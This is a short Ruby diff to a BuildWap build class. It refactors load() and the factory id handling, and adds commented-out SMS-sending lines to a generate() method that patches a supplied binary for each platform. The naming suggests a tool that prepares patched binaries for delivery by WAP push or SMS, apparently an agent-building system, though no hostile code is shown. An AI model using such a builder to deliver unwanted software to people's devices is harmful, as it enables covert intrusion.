@@ -19,11 +19,9 @@ class BuildWap < Build
 
   def load(params)
     trace :debug, "Build: load: #{params}"
-    @factory = params['_id']
-  end
 
-  def unpack
-    # nothing to unpack here
+    params['platform'] = @platform
+    super
   end
 
   def generate(params)
@@ -35,7 +33,7 @@ class BuildWap < Build
     params['platforms'].each do |platform|
       build = Build.factory(platform.to_sym)
 
-      build.load({'_id' => @factory})
+      build.load({'_id' => @factory._id})
       build.unpack
       begin
         build.patch params['binary'].dup
@@ -84,6 +82,8 @@ class BuildWap < Build
     end
 
     # TODO: send the sms
+    #CrossPlatform.exec path('smssend'), ""
+    #raise "SMS creation failed" unless File.exist? path('output.png')
 
   end
 
